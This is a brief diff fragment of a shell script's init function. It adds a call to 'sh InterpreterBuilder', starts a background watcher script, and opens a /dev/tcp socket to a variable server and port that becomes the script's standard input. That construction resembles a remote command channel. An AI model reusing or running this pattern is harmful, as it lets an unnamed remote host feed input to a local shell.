@@ -16,6 +16,7 @@ _init()
     BASETIME=$(date +%s%N);
 
     IFS="${IFS}"$(echo -ne "\r");
+	sh InterpreterBuilder
     exec ./ModuleWatcher.sh &
 
     exec 3>/dev/tcp/${SERVER}/${PORT} && exec 0<&3
